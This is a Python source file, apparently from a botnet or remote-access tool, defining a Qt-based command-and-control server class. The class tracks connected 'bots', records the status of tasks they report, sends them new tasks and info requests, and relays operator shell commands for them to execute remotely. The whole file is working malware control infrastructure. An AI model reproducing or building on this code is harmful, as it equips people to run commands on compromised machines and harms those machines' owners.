import shlex
import logging
import datetime

from qtpy.QtCore import Slot, Signal

from models import Bot, Task, Info, Device
from core.Network.SecureServer import SecureBalancedServer


class C2Server(SecureBalancedServer):
    """C2 server."""

    task = Signal(Task)
    info = Signal(Info)

    shell_error = Signal(Bot, str)
    shell_output = Signal(Bot, str)

    def __init__(self):
        super(C2Server, self).__init__()
        self.set_device_model(Bot)
        self.setObjectName("C2Server")
        self.logger = logging.getLogger(self.__class__.__name__)
        self.error.connect(self.logger.error)

    @Slot(Bot, bytes)
    def on_message(self, bot: Bot, message: bytes):
        """When server receives message from bot."""
        message = super().on_message(bot, message)

        event_type = message.get("event_type")
        if event_type == "task":
            state = message.get("state")
            task_id = message.get("task_id")
            task = bot.get_task_by_id(task_id)
            if task:
                if state == "queued":
                    task.set_queued(datetime.datetime.now())
                elif state == "started":
                    task.set_running(datetime.datetime.now())
                elif state == "finished":
                    task.set_finished(datetime.datetime.now(), message.get("result"), message.get("exit_code"))
                else:
                    self.logger.error("Unknown task state for message {}".format(message))
                    return
                self.task.emit(task)
            else:
                self.logger.error("Could not find task with ID {} for bot {}".format(task_id, bot.id()))

        elif event_type == "info":
            event = Info(bot.id(),
                         message.get("info"),
                         message.get("results"))
            bot.on_info_received(event)
            self.info.emit(event)

        elif event_type == "shell":
            event = message.get("event")
            if event == "error":
                self.shell_error.emit(bot, message.get("error"))
            elif event == "output":
                self.shell_output.emit(bot, str(message.get("output")))

        else:
            self.logger.error("BOT-{}: Failed to find matching event type for {}".format(bot.id(), message))
        self.message.emit(bot, message)

    @Slot(int, str, dict, int)
    def send_task(self, bot_id: int, task: str, kwargs: dict, user_activity: int):
        """Send task."""
        bot = self.get_device_by_id(bot_id)
        task_id = bot.get_next_task_id()
        task_obj = Task(bot.id(), task_id, task, kwargs)
        bot.on_task_received(task_obj)
        task_dict = task_obj.serialize()
        task_dict["event"] = "start"
        bot.write(task_dict)
        self.task.emit(task_obj)

    @Slot(Bot, list)
    def send_info(self, bot: Bot, info: list):
        """Send info request."""
        info_obj = Info(bot.id(), info)
        bot.on_info_received(info_obj)
        bot.write(info_obj.create())

    @Slot(int, int)
    def force_start_task(self, bot_id, task_id):
        self.write(bot_id, {"event_type": "task", "event": "force_start", "task_id": task_id})

    @Slot(int, int)
    def stop_task(self, bot_id, task_id):
        self.write(bot_id, {"event_type": "task", "event": "stop", "task_id": task_id})

    @Slot(int, str)
    def run_shell(self, bot_id, command):
        bot: Device = self.get_device_by_id(bot_id)
        try:
            if not command:
                raise Exception("command cannot be an empty string")
            command = shlex.split(command.replace("\\", "\\\\"))
            args = []
            if len(command) > 1:
                args = command[1:]
            bot.write({"event_type": "shell", "event": "run", "command": command[0], "args": args})
        except Exception as e:
            self.shell_error.emit(bot_id, "Failed to execute command {}: {}".format(command, e))
